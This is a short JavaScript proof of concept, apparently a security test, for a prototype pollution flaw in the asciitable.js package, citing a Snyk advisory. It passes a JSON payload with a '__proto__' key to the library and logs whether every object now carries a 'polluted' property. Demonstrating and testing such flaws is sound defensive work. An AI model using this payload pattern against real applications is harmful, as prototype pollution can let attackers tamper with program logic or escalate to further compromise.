// //https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
// test("Prototype pollution in asciitable.js", () => {
console.log({}.polluted);

  const req = require("asciitable.js");
  const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  req({}, b);

console.log({}.polluted);
// });
